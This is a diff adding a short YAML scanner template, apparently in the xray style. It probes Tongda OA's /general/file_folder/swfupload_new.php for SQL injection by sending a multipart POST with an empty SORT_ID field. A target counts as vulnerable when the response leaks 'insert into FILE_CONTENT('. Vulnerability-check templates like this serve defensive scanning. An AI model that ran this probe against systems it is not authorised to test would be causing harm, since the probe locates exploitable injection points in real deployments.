@@ -1,0 +1,28 @@
+name: tongda-swfupload-new-sql-inject
+rules:
+  - method: POST
+    path: "/general/file_folder/swfupload_new.php"
+    headers:
+      Content-Type: multipart/form-data; boundary=----------WebKitFormBoundary{{rboundary}}
+    body: "\
+      ------------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name=\"ATTACHMENT_ID\"\r\n\
+      \r\n\
+      1\r\n\
+      ------------WebKitFormBoundary{{rboundary}}\r\n\
+      Content-Disposition: form-data; name=\"ATTACHMENT_NAME\"\r\n\
+      \r\n\
+      1\r\n\
+      ------------WebKitFormBoundary{{rboundary}}\r\n\
+      Content-Disposition: form-data; name=\"FILE_SORT\"\r\n\
+      \r\n\
+      2\r\n\
+      ------------WebKitFormBoundary{{rboundary}}\r\n\
+      Content-Disposition: form-data; name=\"SORT_ID\"\r\n\
+      \r\n\
+      ------------WebKitFormBoundary{{rboundary}}--\r\n\
+      "
+    expression: |
+      response.status == 200 && response.body.bcontains(b'insert into FILE_CONTENT(')
+detail:
+  author: 666
